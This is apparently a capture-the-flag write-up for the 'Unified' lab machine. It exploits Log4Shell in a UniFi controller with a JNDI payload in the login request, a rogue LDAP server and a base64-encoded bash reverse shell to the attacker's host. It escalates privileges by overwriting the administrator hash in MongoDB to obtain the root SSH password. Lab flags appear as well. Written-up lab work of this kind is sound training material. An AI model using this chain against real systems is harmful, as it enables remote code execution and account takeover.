# Unified

## Enumeration

### nmap

```
PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR

6789/tcp open  ibm-db2-admin?  syn-ack

8080/tcp open  http-proxy      syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Fri, 18 Feb 2022 20:34:40 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Fri, 18 Feb 2022 20:34:40 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 18 Feb 2022 20:34:40 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|     Request</h1></body></html>
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 18 Feb 2022 20:34:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.234.132:8443/manage

8443/tcp open  ssl/nagios-nsca syn-ack Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/localityName=New York/organizationalUnitName=UniFi
| Subject Alternative Name: DNS:UniFi
| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/localityName=New York/organizationalUnitName=UniFi
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-30T21:37:24
| Not valid after:  2024-04-03T21:37:24
| MD5:   e6be 8c03 5e12 6827 d1fe 612d dc76 a919
| SHA-1: 111b aa11 9cca 4401 7cec 6e03 dc45 5cfe 65f6 d829
| -----BEGIN CERTIFICATE-----
| MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
| UzERMA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQK
| DA1VYmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkw
| HhcNMjExMjMwMjEzNzI0WhcNMjQwNDAzMjEzNzI0WjBrMQswCQYDVQQGEwJVUzER
| MA8GA1UECAwITmV3IFlvcmsxETAPBgNVBAcMCE5ldyBZb3JrMRYwFAYDVQQKDA1V
| YmlxdWl0aSBJbmMuMQ4wDAYDVQQLDAVVbmlGaTEOMAwGA1UEAwwFVW5pRmkwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDe9no5CdrT2i5FyDpaZ71+/1y6
| 0WO356cC1Sbbufd1jRzXWom0dipfN7l+i/BI2KLyXPto+p3BVVwbORQe4OwPYnLu
| CGAxZSOAtMieVAV0VpvbO35MJSWrSgf9qY2UAkSV6wMw40jcPI5MtLAS2c4tQYd2
| bfYisnRZ0/ptCnBVTvJ2jzS7cJEgoZx7U1jMy6UkNuasWIGG3Xeyp2jJwuxrGbJb
| aP7jjHHMvZ/TYh9uHq1rQQlDM4bHMRP+bPB2D6wuQIR3Dsd8ztdi0DpfP/QZp2tE
| iavKrLBpUvAc96g2iEaF3b0piqkzUP31ijqc1RZxW2zaGMl2J9iCBm/eerh7AgMB
| AAGjKTAnMBMGA1UdJQQMMAoGCCsGAQUFBwMBMBAGA1UdEQQJMAeCBVVuaUZpMA0G
| CSqGSIb3DQEBCwUAA4IBAQAFvT2p6uA8sUGzz1WKbQjDPTeRM/ghhPCCqhWH3jF6
| 9udW490Mv0mSZS4pBtcttnJ4D5IWnOeYoxoxw7ZAODhzvzcZ3w6RjnDy7WOB9e0/
| 2ky4i+ABn2tfztNWTa2OBLM3bW1X15D3J7CHSGW1BOP2pA7ersOuP0/IV7Jo61Ok
| FbxK5+8qn5ASRDZTeyCI//l5uYVjd19g7yNs850mv4hB8Y0I0PAzTLKVchv+A8VO
| A2DeT8snk1C5L2Jw+WugNwdeyKqmmZRBKfo0KuQz0YG40zxx0SCAKnIXpUSrnlCU
| VwtOH3PmERL30HjgR25E0RePOUepiX8psGR4CGV2U+dg
|_-----END CERTIFICATE-----

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=2/18%Time=620FFF8A%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x
SF:2020:34:40\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84,"H
SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
SF:tent-Length:\x200\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x2020:34:40\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x204
SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Fri,\x2018\x20Feb\x202022\
SF:x2020:34:40\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><ht
SF:ml\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
SF:0Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family
SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
SF:one;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
SF:Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1\.1\
SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Fri,\x2018\x20Feb\x202
SF:022\x2020:34:40\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80\x9
SF:3\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-fami
SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
SF::none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x93\x
SF:20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x20435\r\nDate:\x20Fri,\x2018\x20Feb\x202022\x2020:3
SF:4:41\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Visit the login page to get the version and `CVE-2021-44228` (good ol' log)

plus this amazing [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)! It's litterally a tutorial

For the maven version I needed the walkthrough (yeah that is kinda stupid)

it's maven `3.6.3`

You know log4j already! the vulnerability is in the "remember me" parameter

```
POST /api/login HTTP/1.1
Host: 10.129.234.132:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.234.132:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Origin: https://10.129.234.132:8443
Content-Length: 69
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"admin",
"password":"admin",
"remember":"${jndi:ldap://10.10.15.59/test}",
"strict":true}

```
Get a hint

```
{"meta":{"rc":"error",
"msg":"api.err.InvalidPayload"},
"data":[]}
```

you can confirm with a data capture with tcpdump on port 389

I already have maven and java installed so make sure you have them too

use this magic one-liner to get and build your exploitation ldap server

```
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

```

Get your `RogueJndi-1.1.jar` from target folder

Prepare a reverse shell payload (encoding to avoid possible errors) 

```
└──╼ $echo 'bash -c bash -i >&/dev/tcp/10.10.15.59/4444 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuNTkvNDQ0NCAwPiYxCg==

```
Use the jndi server

```
└──╼ $java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuNTkvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.15.59"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.15.59:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.15.59:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.15.59:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.15.59:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.15.59:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.15.59:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.15.59:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.15.59:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2

```

Now in burpsuite fix your request to trigger

```
{"username":"admin",
"password":"admin",
"remember":"${jndi:ldap://10.10.15.59:1389/o=tomcat}",
"strict":true}

```


Get a response 

```
...

Mapping ldap://10.10.15.59:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.15.59:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload

```

Get an access

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 58838
id
uid=999(unifi) gid=999(unifi) groups=999(unifi)

```


Get a real shell

```
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ 

```

The rest is trivial

```
unifi@unified:/home/michael$ cat user.txt
cat user.txt
exploiting_log4j_getting_mainstream
...
```

## Privilege escalation

ok here we have to get credentials from the mongodb database

first we need to know on wich port it is 

```
unifi@unified:/home/michael$ ps aux | grep mongo
ps aux | grep mongo
unifi         67  0.3  4.1 1100676 85000 ?       Sl   20:30   0:28 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       4333  0.0  0.0  11468  1032 pts/0    S+   23:05   0:00 grep mongo
```

google says unifi default db is named `ace` (cool name)

Now apply what we know

```
unifi@unified:/home/michael$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
<17 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",

...

```

Now we got admin's password hash...its `SHA-512`

Let's make a new SHA-512 password and update the admin's one with that

on our machine we generate

```
└──╼ $mkpasswd -m sha-512 password
$6$uDlGOjCGTmvgUW9q$ERt26uvyxqNZRjMmQyYagmEwUDtWBEWsPnm2130meMp2acQPe5UrvIFs439D.mQt8N1hDiiAl72xPDHS6lp0r.
```

Then apply

```
unifi@unified:/home/michael$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$uDlGOjCGTmvgUW9q$ERt26uvyxqNZRjMmQyYagmEwUDtWBEWsPnm2130meMp2acQPe5UrvIFs439D.mQt8N1hDiiAl72xPDHS6lp0r."}})'
<eMp2acQPe5UrvIFs439D.mQt8N1hDiiAl72xPDHS6lp0r."}})'
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

seems fine. you can use the previous find() function to check the new hash

Login as the Administrator on the website

go to Settings > Site > Device authentication > SSH authentication

there is root password there

`NotACrackablePassword4U2022`

simple su did not work so you have to ssh as root with that

```
root@unified:~# cat root.txt

```

DOne!






